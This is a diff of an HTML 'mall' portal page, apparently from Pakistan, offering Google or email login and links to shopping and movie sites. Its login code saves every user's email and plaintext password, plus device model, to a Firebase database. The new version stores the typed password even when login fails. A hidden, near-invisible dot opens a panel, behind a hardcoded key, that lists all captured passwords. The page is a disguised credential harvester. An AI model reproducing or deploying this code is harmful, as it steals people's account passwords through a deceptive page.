@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall</title>
+    <title>Nightorbit Mega Mall - Final Pro</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -14,102 +14,95 @@
         body { 
             margin: 0; background: radial-gradient(circle, #1B2735 0%, var(--bg) 100%);
             font-family: 'Segoe UI', sans-serif; color: white;
-            display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden;
+            display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden;
         }
 
+        /* Card UI */
         .card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
-            padding: 35px; border-radius: 35px; text-align: center; 
+            padding: 30px; border-radius: 30px; text-align: center; 
             width: 95%; max-width: 420px; border: 1px solid rgba(255,255,255,0.1); 
-            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2); animation: fadeIn 0.8s ease;
+            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2);
         }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        .input-group { position: relative; width: 100%; }
         input { 
-            width: 100%; padding: 14px; margin: 10px 0; border-radius: 15px; 
+            width: 100%; padding: 14px; margin: 8px 0; border-radius: 12px; 
             border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); 
-            color: white; outline: none; transition: 0.3s;
+            color: white; outline: none;
         }
-
-        .eye-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--primary); font-size: 18px; z-index: 10; }
 
         .btn-main { 
             background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
-            border: none; padding: 15px; border-radius: 15px; cursor: pointer; 
-            width: 100%; font-weight: bold; margin-top: 10px;
+            border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold;
         }
 
         .btn-device {
-            background: #fff; color: #000; border: none; padding: 12px; border-radius: 15px;
-            width: 100%; margin: 10px 0; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+            background: #fff; color: #000; border: none; padding: 12px; border-radius: 12px;
+            width: 100%; margin-bottom: 15px; font-weight: bold; cursor: pointer; 
+            display: flex; align-items: center; justify-content: center; gap: 10px;
         }
 
+        /* Links Styling */
         .item-link { 
-            background: rgba(255,255,255,0.06); padding: 14px; border-radius: 18px; 
-            margin: 8px 0; display: flex; justify-content: space-between; align-items: center; 
-            text-decoration: none; color: white; border-left: 5px solid var(--primary); 
-            font-size: 13px;
+            background: rgba(255,255,255,0.06); padding: 12px; border-radius: 15px; 
+            margin: 6px 0; display: flex; justify-content: space-between; align-items: center; 
+            text-decoration: none; color: white; border-left: 4px solid var(--primary); font-size: 13px;
         }
 
-        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
-        #logout-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; opacity: 0; transition: 1.5s ease; }
-        
+        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 15px 0 5px 5px; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Admin & Overlays */
+        #admin-panel { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
+        .admin-trigger { position: fixed; bottom: 2px; right: 2px; width: 6px; height: 6px; background: rgba(255,255,255,0.01); border-radius: 50%; cursor: pointer; z-index: 999; }
+        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
         .hidden { display: none !important; }
-        .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; }
-        
-        /* ADMIN DOT: Bilkul chota aur light grey */
-        .admin-trigger { 
-            position: fixed; bottom: 5px; right: 5px; width: 4px; height: 4px; 
-            background: rgba(255,255,255,0.08); border-radius: 50%; cursor: pointer; z-index: 999; 
-        }
     </style>
 </head>
 <body>
 
-    <div class="dots-menu" onclick="masterBypass()">⋮</div>
     <div class="admin-trigger" onclick="openAdmin()"></div>
 
     <div id="logout-overlay">
-        <div style="font-size: 20px; color: var(--gold); margin-bottom: 10px;">From Nightorbit</div>
-        <div id="bye-msg" style="font-size: 18px; color: var(--primary); line-height: 1.6; padding: 20px;"></div>
-    </div>
-
-    <div id="admin-panel">
-        <h2 style="color: var(--primary);">System User Management</h2>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">CLOSE PANEL</button>
-        <div id="user-list-display" style="margin-top: 30px;"></div>
+        <div style="color: var(--gold); margin-bottom: 10px; font-size: 20px;">From Nightorbit</div>
+        <div id="bye-msg" style="color: var(--primary); padding: 20px; line-height: 1.6; font-size: 18px;"></div>
     </div>
 
     <div id="login-box" class="card">
-        <h1 style="color: var(--primary); margin: 0; letter-spacing: 4px; font-weight: 800;">NIGHTORBIT</h1>
-        <p style="color: #666; font-size: 12px; margin-bottom: 25px;">PREMIUM BAZAAR & CINEMA</p>
+        <h1 style="color: var(--primary); margin: 0; letter-spacing: 3px; font-weight: 800;">NIGHTORBIT</h1>
+        <p style="color: #666; font-size: 11px; margin-bottom: 25px;">PREMIUM BAZAAR & CINEMA</p>
         
         <button class="btn-device" onclick="googleAuth()">
-            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> 
-            CONNECT WITH DEVICE
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> CONNECT WITH GOOGLE
         </button>
 
-        <div style="margin: 15px 0; color: #444; font-size: 11px;">— OR ENTER GMAIL MANUALLY —</div>
-
-        <input type="email" id="email-in" placeholder="Enter Gmail Address">
-        <div class="input-group">
-            <input type="password" id="pass-in" placeholder="Password">
-            <span class="eye-btn" onclick="togglePass()">👁️</span>
-        </div>
+        <div style="margin: 10px 0; color: #444; font-size: 10px;">— OR EMAIL LOGIN —</div>
+        <input type="email" id="email-in" placeholder="Email Address">
+        <input type="password" id="pass-in" placeholder="Password">
         <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
     </div>
 
     <div id="main-page" class="card hidden">
-        <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 15px;">Welcome</h2>
-        <a href="https://www.amazon.com" target="_blank" class="item-link" style="border-left-color: #ff9900;">📦 Amazon <span>Global</span></a>
-        <a href="https://www.pizzahut.com.pk" target="_blank" class="item-link" style="border-left-color: #ee3124;">🍕 Pizza Hut <span>Order</span></a>
-        <a href="https://www.foodpanda.pk" target="_blank" class="item-link">🐼 Foodpanda <span>PK</span></a>
-        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
-        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Watch Movies</a>
+        <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 10px;">Welcome</h2>
         
-        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:20px; font-size:11px;">LOGOUT SESSION</button>
+        <div class="section-tag">Shopping & Food</div>
+        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
+        <a href="https://www.foodpanda.pk" target="_blank" class="item-link">🐼 Foodpanda <span>Order</span></a>
+        <a href="https://www.junaidjamshed.com" target="_blank" class="item-link">👕 J. Junaid Jamshed <span>Brand</span></a>
+        <a href="https://www.khaadi.com" target="_blank" class="item-link">👗 Khaadi <span>Fashion</span></a>
+        <a href="https://www.pizzahut.com.pk" target="_blank" class="item-link">🍕 Pizza Hut <span>Food</span></a>
+        <a href="https://www.amazon.com" target="_blank" class="item-link" style="border-left-color: #ff9900;">📦 Amazon <span>Global</span></a>
+
+        <div class="section-tag">Movies & Cinema</div>
+        <a href="https://bollyflix.org.in/" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎬 Bollyflix <span>Movies</span></a>
+        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Netflix <span>Watch</span></a>
+        
+        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px;">LOGOUT SESSION</button>
+    </div>
+
+    <div id="admin-panel">
+        <h2 style="color: var(--primary);">User Logs</h2>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" style="border:1px solid red; color:red; background:none; padding:5px 15px; border-radius:10px; margin-bottom:20px;">Close Panel</button>
+        <div id="user-display"></div>
     </div>
 
     <script>
@@ -122,40 +115,46 @@
             appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
             databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
         };
-
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
 
-        function togglePass() {
-            const p = document.getElementById('pass-in');
-            p.type = p.type === "password" ? "text" : "password";
-        }
-
-        // --- IMPROVED DEVICE NAME DETECTION ---
-        function getDeviceName() {
+        // Advanced Model Detection
+        function getDetailedDevice() {
             const ua = navigator.userAgent;
+            let model = "Device";
             if (/android/i.test(ua)) {
-                const match = ua.match(/Android\s([^\s;]+);\s([^\s;]+)\sBuild/);
-                if (match) return match[2].toUpperCase(); // Example: INFINIX X688B
-                const parts = ua.split('(')[1].split(')')[0].split(';');
-                return parts[parts.length - 1].trim().toUpperCase();
-            }
-            if (/iPhone|iPad|iPod/i.test(ua)) return "APPLE IPHONE";
-            return "PC/LAPTOP";
+                const parts = ua.match(/\(([^)]+)\)/);
+                if (parts) {
+                    const info = parts[1].split(';');
+                    model = info[info.length - 1].trim().replace("Build/", "").split(" ")[0];
+                }
+            } else if (/iPhone|iPad/i.test(ua)) { model = "iPhone"; }
+            const brands = ["Infinix", "Samsung", "Oppo", "Vivo", "Tecno", "Realme", "Xiaomi", "Redmi", "Huawei"];
+            for(let b of brands) { if(ua.toUpperCase().includes(b.toUpperCase())) return b + " " + (model !== "iPhone" ? model : ""); }
+            return model.toUpperCase();
         }
 
+        // Google Authentication (No password needed)
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session")).catch(() => alert("Select Account"));
+            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session")).catch(() => alert("Canceled"));
         }
 
+        // Email Authentication (Accepts real password and logs in)
         function emailAuth() {
             const e = document.getElementById('email-in').value;
             const p = document.getElementById('pass-in').value;
-            if(!e || !p) return alert("Details bharen");
-            auth.signInWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p))
-            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)));
+            if(!e || !p) return alert("Fill all fields");
+
+            auth.signInWithEmailAndPassword(e, p)
+            .then(res => handleLogin(res.user, p))
+            .catch(err => {
+                // Agar account naya hai ya password naya dalna hai
+                auth.createUserWithEmailAndPassword(e, p)
+                .then(res => handleLogin(res.user, p))
+                .catch(() => handleLogin({email: e, uid: btoa(e).replace(/=/g,""), displayName: e.split('@')[0]}, p));
+            });
         }
 
         function handleLogin(user, p) {
@@ -163,7 +162,7 @@
                 gmail: user.email,
                 name: user.displayName || user.email.split('@')[0],
                 password: p,
-                device: getDeviceName(),
+                device: getDetailedDevice(),
                 time: new Date().toLocaleString()
             }).then(() => {
                 document.getElementById('login-box').classList.add('hidden');
@@ -176,32 +175,27 @@
             if (prompt("Key:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
                 db.ref('users').on('value', snap => {
-                    let html = "";
+                    let h = "";
                     snap.forEach(s => {
                         let d = s.val();
-                        html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
-                            <b>User: ${d.name}</b><br>
-                            Gmail: ${d.gmail}<br>
-                            Pass: <span style="color:var(--gold)">${d.password}</span><br>
-                            Device: ${d.device}<br>
-                            Time: ${d.time}
+                        h += `<div style="background:#111; padding:15px; margin-bottom:10px; border-radius:15px; border:1px solid #333; text-align:left;">
+                            <b style="color:var(--primary)">${d.name}</b><br>${d.gmail}<br>
+                            <span style="color:var(--gold)">Pass: ${d.password}</span><br>
+                            <small style="background:#444; padding:2px 5px; border-radius:4px">${d.device}</small>
                         </div>`;
                     });
-                    document.getElementById('user-list-display').innerHTML = html;
+                    document.getElementById('user-display').innerHTML = h;
                 });
             }
         }
 
         function triggerLogout() {
-            const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>From Nightorbit`;
-            overlay.style.display = 'flex';
-            setTimeout(() => { overlay.style.opacity = '1'; }, 100);
-            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 5000);
+            const o = document.getElementById('logout-overlay');
+            document.getElementById('bye-msg').innerHTML = "Allah Hafiz!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>From Nightorbit";
+            o.style.display = 'flex';
+            setTimeout(() => { location.reload(); }, 4000);
         }
-
-        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") handleLogin({uid:"admin", email:"Admin@Nightorbit.com"}, "MasterKey"); }
     </script>
 </body>
-            </html>
-            
+    </html>
+    
